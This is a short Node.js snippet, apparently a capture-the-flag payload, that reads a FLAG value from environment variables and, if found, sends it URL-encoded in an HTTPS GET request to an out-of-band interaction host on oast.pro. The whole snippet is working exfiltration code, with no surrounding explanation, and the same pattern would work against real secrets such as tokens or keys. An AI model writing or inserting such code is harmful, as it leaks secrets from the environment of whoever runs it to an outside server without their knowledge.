const https = require('https');
const flag = process.env.FLAG || process.env.flag || null;
if (flag) {
  const url = 'https://8f3a9bc72d6e4a10.oast.pro?data=' + encodeURIComponent(flag);
  https.get(url);
}
